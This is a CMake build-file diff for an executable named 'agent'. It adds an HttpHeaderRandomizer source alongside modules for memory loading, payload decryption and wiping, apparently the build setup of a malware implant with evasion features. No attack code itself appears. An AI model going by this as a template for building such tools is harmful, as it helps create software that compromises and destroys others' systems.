@@ -3,6 +3,7 @@ project(client)
 set(CMAKE_CXX_STANDARD 17)
 find_package(OpenSSL REQUIRED)
 find_package(CURL REQUIRED)
+include_directories(include)
 
 add_library(CommandCore STATIC src/CommandRegistry.cpp)
 
@@ -24,7 +25,7 @@ target_link_libraries(CmdWipe CommandCore)
 target_link_libraries(CmdDeepSleep CommandCore)
 target_link_libraries(CmdSafeMode CommandCore)
 
-add_executable(agent src/main.cpp src/Loader.cpp src/MemoryLoader.cpp src/PayloadDecryptor.cpp src/Globals.cpp src/Wipe.cpp)
+add_executable(agent src/main.cpp src/Loader.cpp src/MemoryLoader.cpp src/PayloadDecryptor.cpp src/Globals.cpp src/HttpHeaderRandomizer.cpp src/Wipe.cpp)
 target_link_libraries(agent dl OpenSSL::Crypto CURL::libcurl CommandCore)
 
 install(TARGETS agent DESTINATION bin)
